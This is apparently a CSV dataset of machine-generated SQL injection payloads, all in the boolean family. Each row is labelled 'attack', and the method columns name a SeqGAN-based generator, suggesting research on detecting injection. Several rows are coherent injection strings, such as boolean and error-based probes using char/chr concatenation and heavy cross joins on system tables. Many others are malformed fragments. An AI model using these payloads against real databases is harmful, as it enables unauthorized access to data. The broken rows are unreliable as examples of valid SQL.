label,payload,family,payload_type,method,run_id,sample_index
attack,1'||  (  select 'hdul$ih'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,0
attack,"-8919%%'  )   or   (  2301  =  7504  )  *7504 and   (  ' '   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'u--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,1
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,2
attack,"1""-   4018 1570 or  (  =    (  =  117",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,3
attack,"1%q""j",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,4
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'w  ""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   """"  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""h  6093  convert  =  where 6849  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,5
attack,-2174v 6503 *  6093  select where (  select r(,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,6
attack,"-9462""  )   'unusual'         )    --z",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,7
attack,"1""a where       =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,8
attack,"-1760znlqnuj""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,9
